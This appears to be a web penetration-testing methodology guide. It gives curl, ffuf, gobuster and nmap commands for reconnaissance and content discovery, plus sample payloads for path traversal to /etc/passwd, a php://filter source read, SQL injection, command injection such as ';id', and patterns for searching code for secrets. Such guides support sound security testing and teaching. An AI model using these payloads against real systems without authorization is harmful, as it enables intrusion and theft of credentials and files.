## Web

### Establish the application baseline

```bash
curl -kI "$URL"
curl -ks "$URL" | tee web/index.html
whatweb -a 3 "$URL"
nmap -Pn -p "$PORT" --script http-title,http-headers,http-methods "$IP"
```

Build requests explicitly when reproducing application behavior:

```bash
curl -ksS -D web/headers.txt -o web/body.html "$URL"
curl -ksS -X OPTIONS -i "$URL"
curl -ksS -u "$USER:$PASS" "$URL/protected"
curl -ksS -b cookies.txt -c cookies.txt "$URL/account"
curl -ksS -H 'Content-Type: application/json' -d '{"name":"test"}' "$URL/api/items"
```

Record redirects, cookies, security headers, framework clues, server versions,
comments, forms, API routes, and referenced JavaScript files. Browse through an
intercepting proxy while keeping command-line requests reproducible.

### Hostnames and virtual hosts

Extract names from redirects and TLS certificates, add confirmed names to
`/etc/hosts`, and test virtual hosts.

```bash
openssl s_client -connect "$IP:443" -servername example.local </dev/null 2>/dev/null \
  | openssl x509 -noout -subject -issuer -ext subjectAltName

ffuf -u "http://$IP/" -H 'Host: FUZZ.example.local' \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs <baseline-size>

gobuster vhost -u "http://$IP" --append-domain -d example.local \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

Filter using a measured baseline response rather than copying an arbitrary size.

### Content discovery

```bash
feroxbuster -u "$URL" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt \
  -x php,asp,aspx,jsp,txt,bak,zip -o web/ferox.txt

ffuf -u "$URL/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -e .php,.txt,.bak,.zip -ac

gobuster dir -u "$URL" \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -x php,asp,aspx,jsp,txt,bak,zip -o web/gobuster.txt

nikto -host "$URL" -output web/nikto.txt
```

Repeat discovery from authenticated areas and beneath interesting directories.
Check `robots.txt`, `sitemap.xml`, backup extensions, exposed repositories,
configuration files, and upload locations.

### Parameter discovery

```bash
ffuf -u "$URL/page?FUZZ=test" \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -ac

ffuf -u "$URL/login" -X POST -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'FUZZ=test' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -ac
```

For each parameter, note its context: filesystem path, database query, shell
command, template, redirect, serialized object, or server-side request.

### File read and path traversal

Test a known local file and vary traversal depth, encoding, separators, and
expected suffixes.

```text
../../../../etc/passwd
..%2f..%2f..%2f..%2fetc%2fpasswd
..\..\..\..\Windows\win.ini
```

```bash
curl -ksG "$URL/download" --data-urlencode 'file=../../../../etc/passwd'
curl -ks "$URL/index.php?page=php://filter/convert.base64-encode/resource=index.php"
```

Useful follow-up targets include application configuration, source files, log
files, SSH keys, service credentials, and process environment—not indiscriminate
filesystem dumps.

### File upload

Determine separately:

- which extensions and MIME types are accepted;
- whether the server renames the file;
- where the file is stored;
- whether it is rendered, parsed, or executed;
- whether path or filename metadata can be controlled.

Start with a harmless marker file. Confirm retrieval before attempting a
server-side payload.

```bash
printf 'upload-marker\n' > web/marker.txt
curl -ksS -F 'file=@web/marker.txt;type=text/plain' "$URL/upload"
curl -ksS -F 'avatar=@web/marker.txt' -b cookies.txt "$URL/profile"
```

Inspect multipart field names, filenames, returned paths, and server-side
renaming in the intercepted browser request.

### SQL injection

Begin with manual tests and compare response status, length, content, and timing.

```text
'
"
' OR '1'='1'-- -
' AND '1'='2'-- -
' ORDER BY 1-- -
' UNION SELECT NULL-- -
```

```bash
curl -ksG "$URL/item" --data-urlencode "id=1' AND '1'='2'-- -"
curl -ksS "$URL/search" -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode "q=test' ORDER BY 2-- -"
```

Identify the database and column count before building a data-extraction query.
Do not treat an error page alone as proof of exploitable injection.

### Command injection

Use a harmless, observable command first and account for the host operating
system and shell context.

```text
; id
&& whoami
| whoami
$(id)
```

```bash
curl -ksG "$URL/ping" --data-urlencode 'host=127.0.0.1;id'
curl -ksG "$URL/ping" --data-urlencode 'host=127.0.0.1;sleep 5' \
  -o /dev/null -w 'total=%{time_total}\n'
```

If output is not reflected, test timing or an authorized callback. Encode only
after understanding which layer blocks the raw input.

### Authentication and sessions

- Test registration, password reset, remember-me, and invitation flows.
- Compare behavior across users rather than guessing authorization flaws.
- Inspect tokens for predictable claims, expiry, audience, and signing behavior.
- Look for identifiers in URLs, JSON bodies, hidden fields, and API requests.
- Re-run content discovery with authenticated cookies or headers.

```bash
curl -ksS -c cookies.txt -d "username=$USER&password=$PASS" "$URL/login"
ffuf -u "$URL/FUZZ" -b "$(awk 'NF && $1 !~ /^#/{printf "%s=%s;",$6,$7}' cookies.txt)" \
  -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -ac
```

### Source and dependency review

When source is available, search for routes, secrets, database connections,
unsafe process execution, file operations, deserialization, and authorization
checks.

```bash
rg -n -i 'password|secret|token|api[_-]?key|connection|string' .
rg -n 'exec\(|system\(|popen\(|subprocess|ProcessBuilder|Runtime\.getRuntime' .
rg -n 'upload|download|readFile|sendFile|deserialize|unserialize' .
rg -n 'TODO|FIXME|DEBUG|localhost|127\.0\.0\.1|0\.0\.0\.0' .
git log --all --oneline --decorate
git log -p --all -- .env '*.config' '*.yml' '*.yaml'
```

Validate dependency versions against the lockfile and actual configuration;
product identification alone is not enough.

### When stuck

- Follow redirects manually and inspect every hostname.
- Compare unauthenticated and authenticated responses.
- Review JavaScript and API traffic for routes absent from the UI.
- Try alternate HTTP methods and content types where the application supports
  them.
- Revisit downloaded backups and configuration files.
- Confirm that a suspected vulnerability reaches the intended interpreter.
